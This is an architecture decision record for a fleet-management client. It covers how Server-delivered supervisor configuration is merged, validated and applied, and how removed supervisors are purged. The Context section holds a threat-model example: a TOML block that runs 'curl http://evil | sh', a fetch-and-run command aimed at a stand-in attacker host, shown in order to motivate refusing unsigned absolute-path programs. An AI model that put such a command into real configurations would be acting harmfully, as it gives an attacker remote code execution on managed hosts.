# ADR-0029: The Client accepts its Supervisor set from the Server — a delivered block names only a Client-owned program, the rest of `supervisor.toml` stays the operator's, and a removed Supervisor is purged

- **Status:** 🟢 accepted
- **Date:** 2026-08-14
- **Deciders:** Markus Brigl

This decision is the Client side of the delivery path ADR-0012 and ADR-0030 build on the Server
side: a typed, published Configuration can reach the Client's own Agent (`service.name =
"supervisor"`, ADR-0022 clause 6, ADR-0022), and this decision says what the Client *does* with it.
It extends ADR-0011 (the `[[supervisor]]` blocks) and ADR-0008 (the configuration file, now
`supervisor.toml`, ADR-0022 clause 10) without changing either's shape.

## Context

The Client's own Agent declares `AcceptsRemoteConfig`. A `remote_config` offered to the self-Agent
that is stored and acknowledged `APPLIED` but changes nothing ("storing *is* applying") would make
that declaration hollow: the fleet view can show the Client's own configuration and offer it
Configurations typed for it, and the Client would answer every offer with a polite lie.

What the fleet actually needs to manage on a Client is *which Supervisors it runs*: the
`[[supervisor]]` blocks of `supervisor.toml` (ADR-0011). Everything else in that file is host-local
trust and wiring — the Server endpoint, the credential, the state directory, the instance name.
That half must never be Server-writable: the configuration that tells the Client where the Server
is and how to authenticate cannot come from the Server without making a bad push unrecoverable
(the Client that applied it can no longer be told anything).

The specification's vocabulary already anticipates the shape of the answer: the effective
configuration "may differ from the remote configuration (it may **merge in local
configuration**, or have rejected the remote one)"
([`SPECIFICATION.md`](../SPECIFICATION.md), Fleet operations). The OpenTelemetry OpAMP
Supervisor does exactly this — remote configuration merged with local configuration files into
the one document the managed process runs.

Two mechanics constrain the design:

- **Supervisors are built at startup** ([`supervisor/mod.rs`](../../crates/client/src/supervisor/mod.rs)),
  and the reconfigure path (`RunOutcome::Reconfigured`) deliberately carries the Engine and its
  Managed Processes across reconnects untouched. Applying a Supervisor change at runtime is
  machinery of its own.
- **`supervisor.toml` is what the self-Agent reports as its effective configuration**
  ([`supervisor/mod.rs`](../../crates/client/src/supervisor/mod.rs#L80-L97)): the file is the
  truth the fleet view shows. Wherever a Server-delivered Supervisor set is persisted, that
  report must keep being true.

**The program a delivered block names is a trust anchor too.** The startup loader's program
resolution (`resolve_program`, `crates/client/src/config.rs`) decides what code runs on the host.
If a delivered block could name an arbitrary absolute path, a Server — or anyone who has
compromised one, *without* the package-signing key — could push:

```toml
[[supervisor]]
type = "command"
name = "x"
command = "/bin/sh"
args = ["-c", "curl http://evil | sh"]
```

and the Client would spawn it. That is fleet-wide command execution as the Client's user (root
under a service install) that needs **no** Ed25519 signature and no content hash — it side-steps the
entire `[packages] verification_key` machinery the rest of the Client enforces. A security review
raised it. Naming an arbitrary absolute path *is* choosing what code runs on the host, which is
precisely what admission (ADR-0013) plus package signing (ADR-0015/0018) exist to gate. A bare name,
by contrast, means a program in `<supervisor_dir>/<name>/program/`, a directory this Client owns and
installs into from signature-verified packages (ADR-0018) — nothing more is needed for the
Server to put a program there legitimately, and a Server-managed Supervisor exists to run what the
Server delivers.

**A Supervisor that leaves the set leaves its directory behind unless something removes it.**
Stopping the Managed Process and sending the Agent's `agent_disconnect`
([`engine.rs`](../../crates/client/src/engine.rs#L636-L662)) does not touch the disk; the whole
per-Supervisor directory of ADR-0018 would stay —

```
<supervisor_dir>/<name>/
  instance-uid            # the Agent identity that just said goodbye
  remote-config.pb        # its last received configuration
  installed-package.json  # what was installed
  config/                 # the written configuration entries
  program/                # the Client-owned binary — a Collector is hundreds of megabytes
  packages/               # download staging
```

The leftovers are not just disk waste, though on a host whose fleet role changes a few times they
are that too (one Collector binary per removed Supervisor). They are **stale identity and stale
trust**: a Supervisor later re-added under the same name would silently inherit the old
`instance-uid` — an Agent that formally disconnected resurrects with its predecessor's identity and
history — plus the old remote configuration and whatever program version the old install left,
instead of starting as the new Agent it is. ADR-0018 flags the shape of this problem for a *moved*
root ("changing `supervisor_dir` on a running host leaves the old tree behind — `instance-uid`
included") and leaves it to the operator; a *Server-driven removal* has no operator on the host, so
nobody is there to clean up. ADR-0015's retention applies to a *superseded package version* of a
living Supervisor — not to a Supervisor that no longer exists.

## Decision

We will make the Client apply a remote configuration **to its `[[supervisor]]` blocks only** —
compare, validate the merge, stop what left, write `supervisor.toml`, purge what was removed, start
what arrived — refuse an offered block that names a program this Client does not own, and refuse to
let a remote configuration touch anything else in the file.

### The Supervisor set is the Server's, the rest of the file the operator's

1. **Only the `[[supervisor]]` blocks of the offered document are read.** Each entry of the
   composed config map is parsed as TOML; the union of their `[[supervisor]]` blocks is the
   offered Supervisor set, and every other top-level key is **ignored** — the boundary is
   enforced by what the Client takes, not by policing what the Server sends. An operator may
   thus publish a full `supervisor.toml`-shaped document (say, one copied from a reference host) and
   exactly its fleet-manageable half takes effect; what actually runs is verifiable in the fleet
   view, which shows the Client's own `supervisor.toml`. A duplicate Supervisor `name` within or
   across entries still fails the offer (`FAILED`, with the reason) — that is not a foreign key
   but a genuine ambiguity inside the accepted scope.

2. **The merge is: local globals, offered Supervisors.** The new document is the current
   `supervisor.toml` with its `[[supervisor]]` blocks replaced by the offered set — nothing else
   changes hands. The merged document is validated by the same loader that validates
   `supervisor.toml` at startup (block schema, program-path resolution, ports, timeouts), and the
   offered blocks must additionally name only a Client-owned program (clause 7). A merge
   that fails validation is reported `FAILED`; nothing is stopped, nothing is written, the
   running configuration stays in force.

3. **Apply is a diff, keyed by Supervisor `name`.** Comparing the running blocks with the offered
   ones yields removed, changed (any key differs), added, and unchanged. Then, in order:
   the removed and changed Supervisors are **stopped** (their Managed Processes shut down, their
   Agents say `agent_disconnect`); the merged document is **written to `supervisor.toml`**; the
   removed Supervisors are **purged** (clauses 8–13); the changed and added Supervisors are
   **started** from the file just written. Unchanged Supervisors keep running untouched — the point
   of managing the set from the Server is that a fleet-wide change to one Supervisor does not cycle
   its neighbours. A crash between the stop and the write restarts into the old file; one between
   the write and the start restarts into the new one — both converge, because startup builds
   exactly what the file says.

4. **`supervisor.toml` remains the single truth.** No overlay, no second file: after an apply, the
   file *is* the configuration, the same file the operator reads and the self-Agent reports —
   the effective-configuration report is refreshed from the written file in the same step. A
   Client restarting offline starts the Server-delivered Supervisors, because they are in its
   file. The write preserves the operator's half literally — comments, ordering, formatting —
   by editing the TOML document surgically (`toml_edit`, the format-preserving parser cargo
   itself edits manifests with) rather than re-serializing it.

5. **The status lifecycle is honest.** The self-Agent acknowledges `APPLYING` on receipt,
   `APPLIED` once the file is written and the starts are issued, `FAILED` when parsing,
   validation, or the write fails. A started Supervisor whose process then crashes is a *health*
   fact, reported as such — the configuration was applied; the process is unhealthy. Storing is
   not applying; the stored copy remains what a restart reports its hash from.

6. **No offer, no change.** A Client whose Server never publishes a Configuration typed
   `supervisor` (ADR-0022 clause 7) runs its locally written `[[supervisor]]` blocks unchanged. The
   first applied offer replaces the local set — from then on the Server's set is authoritative
   for Supervisors on that Client, which is the point, and the reason the offer is compared
   against the *file*, not against the last offer.

### A delivered block names only a Client-owned program

7. **The Client refuses a Server-offered Supervisor set in which any `[[supervisor]]` block names a
   program that is not this Client's own** — the program (and, for a tree, its `program_path`) must
   resolve to a **bare file name** (`owned = true`), never an absolute path. The refusal is a
   validation failure of the whole offer: nothing is stopped, nothing is written, the running set
   stays in force, and the self-Agent reports the offer `FAILED` with a reason that names the
   offending block and program (clause 5). The check is enforced in the apply path
   (`reconfigure.rs`), which knows the blocks came from an offer. ADR-0018 clause 2 refuses an
   absolute path in every block at startup, so every block that parses satisfies this rule; the
   check stays as defence in depth (ADR-0018 clause 10).

### A removed Supervisor is purged

8. **The apply deletes a removed Supervisor's directory** after its Agent has retired and the new
   `supervisor.toml` is written: stop the Managed Process, say the goodbye, and then remove
   `<supervisor_dir>/<name>/` recursively — program, packages, configuration, and identity. Before
   the purge, the Supervisor's adapter is sent `Uninstall` and undoes what its installs did outside
   the directory (ADR-0011).

9. **Removed means removed, not changed.** The purge applies only to names absent from the new
   set. A *changed* block is stopped and restarted by the same apply (clause 3) and keeps
   its directory — identity, program, and installed package ride through a change.

10. **The purge comes after the write, and only after it succeeds.** The apply order is
    stop → write → purge → start. A write that fails restarts the stopped Supervisors from the
    still-standing old file (clause 3) — their directories must still be whole, so nothing is
    deleted before the file says the Supervisor is gone.

11. **The Client deletes only what it owns.** The per-Supervisor directory is Client-created state
    and is removed whole — including `program/`, which holds the Client-owned program (ADR-0018).
    Every Managed Process is such a program (ADR-0018 clause 2).

12. **A directory the apply cannot delete fails nothing.** The Supervisor is already stopped, the
    file already written; a purge error (a file held open on Windows, permissions) is a warning
    naming the path, not a `FAILED` apply — the set the Server asked for *is* running. The
    directory becomes an orphan (clause 13).

13. **An orphaned directory is reported, not reaped.** At startup, a directory under
    `supervisors_root()` that no `[[supervisor]]` block names is logged as a warning with its path —
    whether it survived a purge error, a crash between write and purge, or a block removed from
    `supervisor.toml` by hand while the Client was down. It is **not** deleted: a hand edit is an
    operator's act on the operator's file (the boundary of clause 1), and a block temporarily
    commented out must not cost the Agent its identity and program. The log line makes the leftover
    visible; removing it stays the operator's call.

## Alternatives considered

- **The Server delivers the whole `supervisor.toml`** — rejected in Context: endpoint, credential,
  and state directory are the host's trust anchors; a Server that can rewrite them can cut a
  Client off with one bad push, and the Client has no path back. The Supervisor set is the
  fleet-shaped half of the file; the boundary runs exactly there.
- **A separate overlay file** (state-dir resident, merged at load — the OpAMP Supervisor's
  model, which keeps the last received remote configuration beside the local files). Rejected:
  two files would answer "what does this Client run", the effective-configuration report would
  have to merge them to stay truthful, and an offline restart would depend on state-dir
  internals the operator never sees. Writing the one documented file keeps the one truth.
- **Restart the Client (or all Supervisors) to apply** — the machinery exists
  (`Exit::RestartForUpdate`) and would avoid runtime Agent-set changes. Rejected: it cycles
  every healthy Supervisor to change one, which on a host running several collectors is exactly
  the disruption Selector-scoped rollouts exist to avoid.
- **Fail the offer on any non-Supervisor top-level key** instead of ignoring them. Rejected: it
  turns tolerable input into a fleet-visible error and makes the offer format needlessly rigid —
  a document with one stray global key would apply nothing, though what to do with it is
  unambiguous. The risk of ignoring — an operator believing a pushed global key took effect —
  is answered by the fleet view showing the file that actually runs (clause 4), not by refusing
  the Supervisors that came with it.
- **Re-serialize `supervisor.toml`** with the ordinary `toml` writer instead of adding `toml_edit`.
  Rejected: it destroys the operator's comments and layout in the one file this project
  documents *as* commented prose (the shipped example config) — the file would stop being the
  operator's after the first apply. The dependency is the price of clause 4's "remains the
  operator's file"; cargo's own manifest editing is the precedent that it is fit for this.
- **Let a delivered block name any program — the Server is trusted to manage Agents.** Rejected: it
  makes the whole package-signing apparatus decorative. The threat is a Server compromised below the
  signing key (a leaked REST credential, a mis-scoped operator); signing is meant to keep such an
  actor from running arbitrary code, and an unsigned absolute-path spawn is the exact bypass.
  Admission is a fleet-wide trust boundary (ADR-0013), but that boundary is about *identity between
  Agents*, not a licence for the Server to run any binary on every host.
- **Allowlist specific absolute paths in `supervisor.toml`.** Rejected: it reintroduces host-local
  policy the operator would have to maintain per host, and the fleet path has no need of absolute
  paths at all — the bare-name/owned case already covers everything a Server-delivered Supervisor
  does. A configurable escape hatch is complexity for a capability with no established use.
- **Warn and apply anyway.** Rejected: a warning on a code-execution boundary is not a control. The
  offer is refused as a whole, consistent with how a merge that fails validation is treated
  (clause 2).
- **Keep a removed Supervisor's data** — rejected: it leaks a program-sized directory per removal,
  and a re-added Supervisor of the same name resurrects a disconnected Agent's identity and stale
  configuration instead of starting fresh. The Server-driven removal path has no operator on the
  host to clean up after it.
- **Keep the identity, delete the rest** (preserve `instance-uid`, purge program and state) —
  rejected: half-measures split the directory into kept and deleted parts nobody can reason about,
  and a removed Supervisor's identity *should* end — its Agent said `agent_disconnect`; the
  Baseline's goodbye is meaningless if the same identity reconnects later as something else.
- **A retention window before deletion**, like ADR-0015's `retain_previous_secs` — rejected:
  that retention exists so a *living* Supervisor can roll back to its previous version; a removed
  Supervisor has no process left to roll back. Re-adding it is a fresh install by the same
  delivery path that installed it the first time. A grace period would be machinery for an undo
  nobody has asked for, against Simplicity first.
- **Rename aside instead of deleting** (`<name>.removed-<timestamp>/`) — rejected: it converts a
  leak into a slower leak and hands the operator a janitorial duty the removal was supposed to
  perform.
- **Also reap orphaned directories at startup** — rejected as the default (clause 13 logs instead):
  startup cannot tell a Server-driven removal's leftover from an operator's deliberate or
  temporary hand edit, and the destructive reading of that ambiguity deletes an identity and a
  program that were not meant to go. If the log line proves insufficient, a follow-up can revisit
  reaping with an explicit opt-in.

## Sources / Prior art

- [OpAMP specification `v0.19.0`](https://github.com/open-telemetry/opamp-spec/blob/v0.19.0/specification.md)
  — `EffectiveConfig` is explicitly allowed to differ from the offered remote configuration by
  merging local configuration; `RemoteConfigStatuses` (`APPLYING`/`APPLIED`/`FAILED`) is the
  lifecycle clause 5 adopts.
- [OpAMP specification `v0.20.0`](https://github.com/open-telemetry/opamp-spec/blob/v0.20.0/specification.md)
  — `agent_disconnect` as the Agent's final word; an identity that has said it should not silently
  return (the reasoning behind deleting `instance-uid`).
- [OpenTelemetry OpAMP Supervisor](https://github.com/open-telemetry/opentelemetry-collector-contrib/blob/main/cmd/opampsupervisor/README.md)
  and its [specification](https://github.com/open-telemetry/opentelemetry-collector-contrib/blob/main/cmd/opampsupervisor/specification/README.md)
  (checked 2026-08-12) — the established remote-plus-local merge, with explicit precedence
  control (`agent.config_files` placeholders). Taken: the merge and the local-wins boundary for
  host-local settings. Not taken: the separate storage of the remote part (see Alternatives).
  The OpAMP Supervisor (opamp-go) and the Collector's Supervisor deliver an *agent the Supervisor
  itself owns and installs*; they do not offer "run this arbitrary host binary" as a remote-config
  primitive — the managed executable is the Supervisor's own, which is the owned-only shape clause 7
  makes mandatory for the pushed case.
- [`toml_edit`](https://docs.rs/toml_edit) (checked 2026-08-12) — format- and comment-preserving
  TOML editing; what `cargo add`/`cargo-edit` mutate manifests with.
- **Debian/apt: `remove` vs `purge`** — the established distinction between stopping/removing a
  thing and purging its configuration and state; clauses 8–13 choose purge semantics for a
  Server-driven removal precisely because no operator is present to run the second step.
  <https://www.debian.org/doc/manuals/debian-faq/uptodate.en.html>
- **Bindplane collector uninstall** — removes the collector's install directory and state as one
  act; the managed-fleet precedent that removal means the files go.
  <https://docs.bindplane.com/deployment/virtual-machine/collector/install-and-uninstall-bindplane-collectors>
- In-repo: ADR-0011 (the `[[supervisor]]` blocks), ADR-0012/ADR-0030 (the Server-side
  delivery path this completes), ADR-0017 (the self-Agent), ADR-0014 (the pattern of a verified,
  persisted Server offer changing what the Client runs), ADR-0018 (the directory, its ownership
  rule, and the flagged leftover-tree problem), ADR-0015/0018 (signed, hash-verified delivery),
  ADR-0015 (retention for the living, contrasted deliberately).

## Consequences

- Positive: Supervisors are fleet-manageable end to end — an operator publishes a typed
  Configuration and the matching Clients converge on the named Supervisor set, with the same
  draft/publish gate and Selector scoping every other Configuration has (ADR-0012, ADR-0030).
  The self-Agent's `AcceptsRemoteConfig` is not a lie.
- Positive: unchanged Supervisors ride through an apply untouched; a fleet-wide change to one
  collector type does not restart the others.
- Positive: the package-signing trust model holds even against a Server compromised below the
  signing key — a pushed Supervisor set can only ever run Client-owned programs, which are
  themselves delivered as signature/hash-verified packages. The delivery path's code-execution
  surface is exactly what the Client's own directory consents to.
- Positive: a removal is complete — no program-sized leftovers, no stale identity, no stale
  configuration. Re-adding a Supervisor under the same name is a genuinely fresh Agent, installed
  by the same package path as any new one. The ADR-0018 leftover problem shrinks to the cases an
  operator causes by hand (moved root, offline edit), and those are visible in the log instead of
  silent.
- Negative / trade-offs: the Engine adds and removes Agents at runtime — machinery beyond a
  startup-fixed set. A removed Supervisor's Agent must disconnect cleanly, an added one must
  introduce itself mid-connection, and the event channel's index-keyed routing must survive the
  mutation. This is the substantial implementation cost of the decision.
- Negative / trade-offs: a dependency (`toml_edit`) in the Client.
- Negative / trade-offs: a Server cannot deliver a Supervisor that runs a pre-existing machine
  binary. This is an intentional loss of a capability that had no fleet-shaped use and a real
  code-execution risk.
- Negative / trade-offs: after the first applied offer, a *local* edit to the `[[supervisor]]`
  blocks drifts silently: the Client reports the offer's hash as applied, so the Server —
  whose composed map is unchanged — never re-offers, and the local edit stands until the next
  publication overwrites it. Reconciling file-vs-offer at startup is a follow-up, not part of
  this decision.
- Negative / trade-offs: **removal is destructive and final.** A Supervisor removed by a
  mis-scoped Selector loses its identity, its Server-side history continuity, and its locally
  installed program; re-adding restores service, not history. This is accepted as the honest
  meaning of "removed" — the alternative (stale resurrection) is worse, and rollout scoping is
  the Server-side gate for it.
- Negative / trade-offs: a crash between the `supervisor.toml` write and the purge, or a purge
  error, leaves an orphan directory that startup only reports — a human closes that loop.
- Negative / trade-offs: the e2e removal contract pins goodbye and file, and additionally
  "directory gone" (and "directory kept" for a changed block).
- Follow-ups: startup reconciliation of a locally edited Supervisor set against the last stored
  offer; a bundled-UI affordance for authoring Supervisor-set Configurations (the boundary of
  clause 1 suggests a dedicated editor rather than a free-text body); the reserved `SIGHUP`
  configuration reload ([`runtime.rs`](../../crates/client/src/service/runtime.rs#L329-L338))
  could reuse clause 3's diff-apply for local edits; whether the startup report of orphaned
  directories should grow an explicit, opt-in reap; whether `service uninstall` (which deliberately
  keeps all state) should offer a purge of the whole `supervisors_root()` by the same rule.
